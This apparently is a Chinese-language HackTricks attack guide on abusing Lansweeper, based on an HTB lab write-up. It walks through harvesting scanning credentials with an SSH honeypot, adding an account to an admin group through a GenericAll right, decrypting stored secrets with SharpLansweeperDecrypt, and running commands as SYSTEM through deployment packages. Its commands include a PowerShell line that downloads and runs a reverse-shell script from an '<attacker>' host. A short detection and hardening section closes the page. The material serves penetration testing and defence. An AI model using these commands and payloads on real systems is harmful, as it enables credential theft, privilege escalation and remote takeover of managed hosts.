# Lansweeper 滥用：凭证收集、秘密解密与部署 RCE

{{#include ../../banners/hacktricks-training.md}}

Lansweeper 是一个常部署在 Windows 并与 Active Directory 集成的 IT 资产发现与清点平台。配置在 Lansweeper 中的凭证被其扫描引擎用于通过 SSH、SMB/WMI 和 WinRM 等协议对资产进行认证。配置错误常常允许：

- 通过将扫描目标重定向到攻击者控制的主机（honeypot）来拦截凭证
- 滥用由 Lansweeper 相关组暴露的 AD ACLs（访问控制列表）以获取远程访问
- 在主机上解密 Lansweeper 配置的秘密（连接字符串和存储的扫描凭证）
- 通过 Deployment 功能在被管理的终端上执行代码（通常以 SYSTEM 身份运行）

本页总结了在实战演练中滥用这些行为的实用攻击者工作流程和命令。

## 1) 通过 honeypot 收集扫描凭证（SSH 示例）

思路：创建一个指向你的主机的 Scanning Target，并将已有的 Scanning Credentials 映射到该目标。当扫描运行时，Lansweeper 会尝试使用这些凭证进行认证，而你的 honeypot 会捕获它们。

步骤概览（Web UI）：
- Scanning → Scanning Targets → Add Scanning Target
- 类型：IP Range（或 Single IP）= 你的 VPN IP
- 将 SSH 端口配置为可访问的端口（例如，如果 22 被阻挡可用 2022）
- 禁用计划并设置为手动触发
- Scanning → Scanning Credentials → 确保存在 Linux/SSH 凭证；将它们映射到新目标（按需启用全部）
- 在目标上点击 “Scan now”
- 运行一个 SSH honeypot 并检索尝试的用户名/密码

Example with sshesame:
```yaml
# sshesame.conf
server:
listen_address: 10.10.14.79:2022
```

```bash
# Install and run
sudo apt install -y sshesame
sshesame --config sshesame.conf
# Expect client banner similar to RebexSSH and cleartext creds
# authentication for user "svc_inventory_lnx" with password "<password>" accepted
# connection with client version "SSH-2.0-RebexSSH_5.0.x" established
```
将捕获的 creds 在 DC 服务上验证：
```bash
# SMB/LDAP/WinRM checks (NetExec)
netexec smb   inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
备注
- 对于其他协议，当你可以将扫描器强制连到你的 listener（SMB/WinRM honeypots 等）时，方法类似。SSH 通常最简单。
- 许多扫描器会通过特有的 client banners（例如 RebexSSH）标识自己，并会尝试一些无害命令（uname、whoami 等）。

## 2) AD ACL abuse: 通过将自己添加到应用管理员组获得远程访问

使用 BloodHound 从被攻陷的账号枚举有效权限。常见发现是一个扫描器或应用特定的组（例如 “Lansweeper Discovery”）对某个特权组（例如 “Lansweeper Admins”）拥有 GenericAll 权限。如果该特权组同时是 “Remote Management Users” 的成员，那么一旦我们把自己加入其中，WinRM 就会可用。

收集示例：
```bash
# NetExec collection with LDAP
netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhound -c All --dns-server <DC_IP>

# RustHound-CE collection (zip for BH CE import)
rusthound-ce --domain sweep.vl -u svc_inventory_lnx -p '<password>' -c All --zip
```
用 BloodyAD (Linux) 在 group 上利用 GenericAll：
```bash
# Add our user into the target group
bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '<password>' \
add groupMember "Lansweeper Admins" svc_inventory_lnx

# Confirm WinRM access if the group grants it
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
然后获取一个交互式 shell:
```bash
evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
提示：Kerberos 操作对时间敏感。如果遇到 KRB_AP_ERR_SKEW，请先与 DC 同步：
```bash
sudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>
```
## 3) 在主机上解密 Lansweeper 配置的机密

在 Lansweeper 服务器上，ASP.NET 站点通常存储加密的连接字符串和应用使用的对称密钥。拥有合适的本地访问权限后，你可以解密 DB 连接字符串，然后提取存储的扫描凭据。

典型位置：
- Web 配置: `C:\Program Files (x86)\Lansweeper\Website\web.config`
- `<connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">` … `<EncryptedData>…`
- 应用密钥: `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`

使用 SharpLansweeperDecrypt 自动化解密并导出存储的凭据：
```powershell
# From a WinRM session or interactive shell on the Lansweeper host
# PowerShell variant
Upload-File .\LansweeperDecrypt.ps1 C:\ProgramData\LansweeperDecrypt.ps1   # depending on your shell
powershell -ExecutionPolicy Bypass -File C:\ProgramData\LansweeperDecrypt.ps1
# Tool will:
#  - Decrypt connectionStrings from web.config
#  - Connect to Lansweeper DB
#  - Decrypt stored scanning credentials and print them in cleartext
```
预期输出包括 DB 连接详情和明文扫描凭据，例如用于整个资产中的 Windows 和 Linux 账户。这些账户通常在域主机上具有提升的本地权限：
```text
Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
Inventory Linux    svc_inventory_lnx        <StrongPassword!>
```
使用恢复的 Windows 扫描 creds 获取特权访问：
```bash
netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
# Typically local admin on the Lansweeper-managed host; often Administrators on DCs/servers
```
## 4) Lansweeper Deployment → SYSTEM RCE

作为 “Lansweeper Admins” 的成员，web UI 会暴露 Deployment 和 Configuration。在 Deployment → Deployment packages 下，你可以创建在目标资产上运行任意命令的 packages。命令由 Lansweeper 服务以高权限执行，在所选主机上以 NT AUTHORITY\SYSTEM 获得代码执行。

High-level steps:
- 创建一个新的 Deployment package，执行 PowerShell 或 cmd 的一行命令（reverse shell、add-user 等）。
- 定位到目标资产（例如运行 Lansweeper 的 DC/host），然后点击 Deploy/Run now。
- 以 SYSTEM 身份接收你的 shell。

示例 payloads (PowerShell):
```powershell
# Simple test
powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"

# Reverse shell example (adapt to your listener)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')"
```
OPSEC
- 部署操作会产生大量噪声并在 Lansweeper 和 Windows 事件日志中留下日志。谨慎使用。

## 检测与加固

- 限制或移除匿名 SMB 枚举。监控 RID cycling 和对 Lansweeper 共享的异常访问。
- 出站控制：阻止或严格限制扫描主机的出站 SSH/SMB/WinRM。对非标准端口（例如 2022）和异常客户端横幅（如 Rebex）触发告警。
- 保护 `Website\\web.config` 和 `Key\\Encryption.txt`。将 secrets 外置到 vault 并在暴露时进行轮换。考虑使用权限最小的服务账户和在可行时使用 gMSA。
- AD 监控：对与 Lansweeper 相关的组（例如 “Lansweeper Admins”, “Remote Management Users”）的更改触发告警，以及对授予特权组 GenericAll/Write 成员权限的 ACL 更改触发告警。
- 审计 Deployment 包的创建/更改/执行；对启动 cmd.exe/powershell.exe 或异常出站连接的包触发告警。

## 相关主题
- SMB/LSA/SAMR enumeration and RID cycling
- Kerberos password spraying and clock skew considerations
- BloodHound path analysis of application-admin groups
- WinRM usage and lateral movement

## 参考资料
- [HTB: Sweep — Abusing Lansweeper Scanning, AD ACLs, and Secrets to Own a DC (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
- [sshesame (SSH honeypot)](https://github.com/jaksi/sshesame)
- [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
- [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [BloodHound CE](https://github.com/SpecterOps/BloodHound)

{{#include ../../banners/hacktricks-training.md}}
